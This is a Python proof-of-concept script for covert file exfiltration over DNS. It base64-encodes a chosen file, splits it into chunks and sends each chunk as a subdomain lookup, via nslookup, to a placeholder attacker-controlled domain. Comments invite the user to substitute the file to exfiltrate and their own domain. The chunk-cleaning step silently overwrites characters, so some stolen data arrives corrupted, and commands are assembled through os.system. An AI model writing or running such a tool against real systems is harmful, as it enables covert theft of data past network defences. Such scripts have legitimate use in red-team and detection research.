import os
import base64

def url_safe_base64_encode_file(file_path):
    with open(file_path, 'rb') as file:
        # Read the file content
        file_data = file.read()
        # Encode the file content into base64
        base64_encoded = base64.urlsafe_b64encode(file_data).decode()
        # Remove padding '=' characters
        base64_encoded = base64_encoded.rstrip('=')
    return base64_encoded

def make_dns_request(chunk, domain, dns_server):
    try:
        # Combine the chunk with the domain
        subdomain = f"{chunk}.{domain}"
        
        # Use os.system to run the nslookup command
        cmd = f"nslookup {subdomain} {dns_server}"
        response = os.system(cmd)
        
    except Exception as e:
        return str(e)

def ensure_starts_with_letter_or_number(chunk):
    # Ensure the chunk starts with a letter or number
    if not chunk[0].isalnum():
        chunk = 'A' + chunk[1:]
    return chunk

# File path
file_path = "poc.zip" # Change to file you want to exfiltrate

# Encode the file into URL-safe base64
encoded_data = url_safe_base64_encode_file(file_path)

# Break the encoded data into 32-character chunks
chunk_size = 32
chunks = [encoded_data[i:i+chunk_size] for i in range(0, len(encoded_data), chunk_size)]

# Domain to make DNS requests to
domain = "sub.yourdomainhere.tld" # Change to your URL

# DNS server to use (Cloudflare)
dns_server = "1.1.1.1"

# Modify chunks to ensure they start with a letter or number
chunks = [ensure_starts_with_letter_or_number(chunk) for chunk in chunks]

# Make DNS requests for each chunk
for chunk in chunks:
    print(f"Sending: {chunk}")
    make_dns_request(chunk, domain, dns_server)
